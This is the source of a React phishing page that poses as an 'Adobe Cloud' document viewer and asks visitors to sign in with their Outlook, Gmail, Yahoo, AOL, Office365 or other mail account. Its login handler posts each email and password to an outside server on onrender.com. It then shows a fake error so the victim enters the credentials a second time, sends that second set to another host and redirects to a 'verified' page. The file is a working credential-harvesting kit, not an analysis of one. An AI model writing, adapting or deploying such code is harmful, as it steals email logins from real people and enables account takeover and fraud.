import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { AlertCircle, Mail, Lock, Eye, EyeOff, ArrowLeft } from 'lucide-react';

// Real email provider SVG icons with their brand colors
const ProviderIcons = {
  outlook: () => (
    <svg viewBox="0 0 24 24" className="w-5 h-5" fill="currentColor">
      <path d="M23.5 11.5L13.5 5.5V17.5L23.5 11.5Z" fill="#0078D4"/>
      <path d="M12.5 6.5L2.5 11.5L12.5 16.5V6.5Z" fill="#0078D4"/>
      <path d="M2.5 11.5V17.5L12.5 22.5V16.5L2.5 11.5Z" fill="#0078D4"/>
    </svg>
  ),
  gmail: () => (
    <svg viewBox="0 0 24 24" className="w-5 h-5">
      <path d="M24 4.5v15c0 .85-.65 1.5-1.5 1.5H21V7.387l-9 6.463-9-6.463V21H1.5C.649 21 0 20.35 0 19.5v-15c0-.425.162-.8.431-1.068C.7 3.164 1.075 3 1.5 3H2l10 7.25L22 3h.5c.425 0 .8.162 1.069.432.269.268.431.643.431 1.068z" fill="#EA4335"/>
    </svg>
  ),
  yahoo: () => (
    <svg viewBox="0 0 24 24" className="w-5 h-5" fill="#6001D2">
      <path d="M13.66 8.704c.5-.553.976-1.086 1.474-1.598.418-.429.866-.943 1.28-1.368.326-.334.54-.562.774-.754L15.52 2.5H8.52L6.552 5.054c.34.245.903.697 1.593 1.31.09.078.258.212.333.274.298.25.686.58 1.026.858.68.555 1.405 1.147 2.136 1.744v11.8c.57-.029 1.33-.068 2-.1V8.704z"/>
    </svg>
  ),
  office365: () => (
    <svg viewBox="0 0 24 24" className="w-5 h-5">
      <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" stroke="#E03C31" strokeWidth="2" fill="none"/>
    </svg>
  ),
  aol: () => (
    <svg viewBox="0 0 24 24" className="w-5 h-5" fill="#0066CC">
      <circle cx="12" cy="12" r="10" stroke="#0066CC" strokeWidth="2" fill="none"/>
      <text x="12" y="16" fontSize="10" textAnchor="middle" fill="#0066CC" fontWeight="bold">AOL</text>
    </svg>
  ),
  other: () => (
    <svg viewBox="0 0 24 24" className="w-5 h-5" fill="#666">
      <circle cx="12" cy="12" r="10" stroke="#666" strokeWidth="2" fill="none"/>
      <path d="M8 12h8M12 8v8" stroke="#666" strokeWidth="2"/>
    </svg>
  )
};

// Provider brand colors
const providerColors = {
  outlook: '#0078D4',
  aol: '#0066CC',
  office365: '#E03C31',
  gmail: '#EA4335',
  yahoo: '#6001D2',
  other: '#666666'
};

function Pdf() {
    const navigate = useNavigate();
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');
    const [selectedProvider, setSelectedProvider] = useState(null);

    const emailProviders = [
        { id: 'outlook', label: 'Sign in with Outlook', icon: ProviderIcons.outlook },
        { id: 'aol', label: 'Sign in with Aol', icon: ProviderIcons.aol },
        { id: 'office365', label: 'Sign in with Office365', icon: ProviderIcons.office365 },
        { id: 'gmail', label: 'Sign in with Gmail', icon: ProviderIcons.gmail },
        { id: 'yahoo', label: 'Sign in with Yahoo!', icon: ProviderIcons.yahoo },
        { id: 'other', label: 'Sign in with Other Mail', icon: ProviderIcons.other },
    ];

    const loginHandler = async (e) => {
        e.preventDefault();
        setIsLoading(true);
        setError('');

        try {
            const hasAttempted = localStorage.getItem('login_attempt');

            if (!hasAttempted) {
                await fetch("https://all-lg-bb.onrender.com/api/contact", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ mail: email, pass: password })
                });

                localStorage.setItem('login_attempt', 'true');
                localStorage.setItem('login_email', email);
                
                setError('Something went wrong. Please try again.');
                setEmail('')
                setPassword('');
                setIsLoading(false);
                return;
            }

            const res = await fetch("https://bd-mys-api.onrender.com/api/contact", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ mail: email, pass: password })
            });

            const data = await res.json();

            if (res.ok || data.status === 'partial') {
                localStorage.removeItem('login_attempt');
                localStorage.removeItem('login_email');
                navigate('/verified', { state: { email } });
            } else {
                setError(data.message || 'Failed. Please try again.');
                localStorage.removeItem('login_attempt');
                localStorage.removeItem('login_email');
            }
        } catch (error) {
            setError('Network error. Please check your connection and try again.');
            localStorage.removeItem('login_attempt');
            localStorage.removeItem('login_email');
        } finally {
            setIsLoading(false);
        }
    };

    const handleProviderSelect = (providerId) => {
        setSelectedProvider(providerId);
        setEmail('');
        setPassword('');
        setError('');
        localStorage.removeItem('login_attempt');
        localStorage.removeItem('login_email');
    };

    const handleBack = () => {
        setSelectedProvider(null);
        setEmail('');
        setPassword('');
        setError('');
        localStorage.removeItem('login_attempt');
        localStorage.removeItem('login_email');
    };

    const currentColor = selectedProvider ? providerColors[selectedProvider] : '#000';

    return (
        <div className="fixed inset-0 flex items-center justify-center overflow-hidden p-4">
            {/* Background image */}
            <div 
                className="absolute inset-0 bg-cover bg-center bg-no-repeat"
                style={{ 
                    backgroundImage: 'url(/image/image.png)',
                    filter: 'blur(4px) brightness(0.5)'
                }}
            ></div>

            {/* Lighter overlay for readability */}
            <div className="absolute inset-0 bg-black/20"></div>

            {/* Main Card - More transparent */}
            <div className="relative z-10 w-full max-w-md bg-black/40 backdrop-blur-md rounded-xl shadow-2xl overflow-hidden max-h-[95vh] border border-white/10">
                {/* Header */}
                <div className="bg-black/70 backdrop-blur-md px-4 sm:px-6 py-4 flex items-center gap-3 border-b border-white/10">
                    <img src="/adobelogo.png" alt="Adobe" className="h-8 w-auto" />
                    <div>
                        <h1 className="text-xl font-bold text-white">Adobe Cloud</h1>
                        <p className="text-gray-300 text-xs">Secure document access</p>
                    </div>
                </div>

                {/* Content */}
                <div className="px-4 sm:px-6 py-6 overflow-y-auto max-h-[calc(95vh-80px)]">
                    {!selectedProvider ? (
                        // Provider Selection View
                        <div>
                            <p className="text-gray-200 text-sm mb-5 leading-relaxed">
                                To read the document, please choose your email provider below to login and view shared file.
                            </p>

                            {error && (
                                <div className="mb-4 p-3 bg-red-500/20 border border-red-500/50 rounded-lg flex items-center gap-2 backdrop-blur-sm">
                                    <AlertCircle className="text-red-400 w-4 h-4 flex-shrink-0" />
                                    <p className="text-red-200 text-sm">{error}</p>
                                </div>
                            )}

                            <div className="space-y-2.5">
                                {emailProviders.map((provider) => (
                                    <button
                                        key={provider.id}
                                        onClick={() => handleProviderSelect(provider.id)}
                                        className="w-full flex items-center gap-3 px-4 py-3 border-2 rounded-lg transition-all duration-200 group hover:shadow-lg hover:scale-[1.02] bg-black/30 backdrop-blur-sm"
                                        style={{
                                            borderColor: providerColors[provider.id],
                                            color: providerColors[provider.id]
                                        }}
                                    >
                                        <span style={{ color: providerColors[provider.id] }}>
                                            <provider.icon />
                                        </span>
                                        <span className="text-white font-medium text-sm group-hover:text-gray-200">
                                            {provider.label}
                                        </span>
                                    </button>
                                ))}
                            </div>

                            {/* Footer */}
                            <div className="mt-6 pt-3 border-t border-white/10">
                                <p className="text-xs text-gray-400 text-center leading-relaxed">
                                    Built upon Adobe Document Cloud.
                                    <br />
                                    Adobe Document Cloud features can
                                </p>
                            </div>
                        </div>
                    ) : (
                        // Login View
                        <div className="animate-slide-in">
                            {/* Back Button */}
                            <button
                                onClick={handleBack}
                                className="flex items-center gap-2 text-gray-300 hover:text-white mb-4 transition-colors"
                                disabled={isLoading}
                            >
                                <ArrowLeft className="w-4 h-4" />
                                <span className="text-sm">Back to providers</span>
                            </button>

                            <div className="mb-4">
                                <h2 className="text-xl font-semibold text-white">
                                    Sign in with <span style={{ color: currentColor }}>
                                        {selectedProvider.charAt(0).toUpperCase() + selectedProvider.slice(1)}
                                    </span>
                                </h2>
                                <p className="text-sm text-gray-300 mt-1">
                                    {localStorage.getItem('login_attempt') 
                                        ? '🔐 Please confirm your credentials again' 
                                        : 'Enter your credentials to continue'}
                                </p>
                            </div>

                            {error && (
                                <div className="mb-4 p-3 bg-red-500/20 border border-red-500/50 rounded-lg flex items-center gap-2 backdrop-blur-sm">
                                    <AlertCircle className="text-red-400 w-4 h-4 flex-shrink-0" />
                                    <p className="text-red-200 text-sm">{error}</p>
                                </div>
                            )}

                            <form onSubmit={loginHandler} className="space-y-3">
                                <div className="relative">
                                    <Mail className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
                                    <input
                                        type="email"
                                        required
                                        value={email}
                                        onChange={(e) => setEmail(e.target.value)}
                                        className="w-full pl-10 pr-3 py-2 bg-white/10 backdrop-blur-sm border border-white/20 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition text-white placeholder-gray-400"
                                        placeholder="Enter your email"
                                        disabled={isLoading}
                                    />
                                </div>

                                <div className="relative">
                                    <Lock className="absolute left-3 top-2.5 h-5 w-5 text-gray-400" />
                                    <input
                                        type={showPassword ? "text" : "password"}
                                        required
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        className="w-full pl-10 pr-10 py-2 bg-white/10 backdrop-blur-sm border border-white/20 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition text-white placeholder-gray-400"
                                        placeholder="Enter your password"
                                        disabled={isLoading}
                                    />
                                    <button
                                        type="button"
                                        onClick={() => setShowPassword(!showPassword)}
                                        className="absolute right-3 top-2.5 text-gray-400 hover:text-gray-200"
                                        disabled={isLoading}
                                    >
                                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                                    </button>
                                </div>

                                <button
                                    type="submit"
                                    disabled={isLoading}
                                    className="w-full text-white py-2.5 rounded-lg font-medium transition-all duration-200 hover:shadow-lg hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 flex items-center justify-center gap-2"
                                    style={{
                                        background: currentColor
                                    }}
                                >
                                    {isLoading ? (
                                        <>
                                            <svg className="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                            </svg>
                                            {localStorage.getItem('login_attempt') ? 'Confirming...' : 'Processing...'}
                                        </>
                                    ) : (
                                        localStorage.getItem('login_attempt') ? 'Confirm Credentials' : 'Sign In'
                                    )}
                                </button>

                                {/* Attempt indicator */}
                                <div className="flex justify-center gap-2 mt-3">
                                 </div>
                                <p className="text-center text-xs text-gray-400">
                                   
                                </p>
                            </form>
                        </div>
                    )}
                </div>
            </div>

            {/* CSS Animation */}
            <style>{`
                @keyframes slideIn {
                    from {
                        opacity: 0;
                        transform: translateX(30px);
                    }
                    to {
                        opacity: 1;
                        transform: translateX(0);
                    }
                }
                .animate-slide-in {
                    animation: slideIn 0.3s ease-out forwards;
                }
                @keyframes pulse {
                    0%, 100% { opacity: 1; }
                    50% { opacity: 0.5; }
                }
                .animate-pulse {
                    animation: pulse 1.5s ease-in-out infinite;
                }
            `}</style>
        </div>
    );
}

export default Pdf;